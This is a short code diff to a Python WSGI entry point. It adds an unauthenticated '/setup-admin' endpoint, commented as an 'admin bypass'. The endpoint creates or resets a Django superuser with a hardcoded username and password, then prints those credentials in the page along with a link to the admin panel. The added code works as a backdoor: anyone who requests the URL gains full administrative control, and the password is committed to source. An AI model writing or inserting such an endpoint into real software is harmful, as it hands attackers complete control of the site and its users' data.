@@ -39,6 +39,35 @@ def application(environ, start_response):
         ])
         return [b'{"status":"ok"}']
 
+    # Setup admin bypass - creates admin user directly
+    if path in ['/setup-admin/', '/setup-admin']:
+        try:
+            from django.contrib.auth.models import User
+            user, created = User.objects.get_or_create(
+                username='admin360',
+                defaults={
+                    'email': 'admin@360egy.com',
+                    'is_staff': True,
+                    'is_superuser': True,
+                }
+            )
+            user.set_password('Egy360Admin2026!')
+            user.save()
+            msg = "Admin created!" if created else "Admin password reset!"
+            body = f"{msg}<br>User: admin360<br>Pass: Egy360Admin2026!<br><a href='/admin/'>Go to Admin</a>"
+            start_response('200 OK', [
+                ('Content-Type', 'text/html'),
+                ('Content-Length', str(len(body))),
+            ])
+            return [body.encode()]
+        except Exception as e:
+            body = f"Error: {str(e)}"
+            start_response('500 OK', [
+                ('Content-Type', 'text/html'),
+                ('Content-Length', str(len(body))),
+            ])
+            return [body.encode()]
+
     # Log all requests for debugging
     print(f"WSGI REQUEST: {path}", file=sys.stderr, flush=True)
 
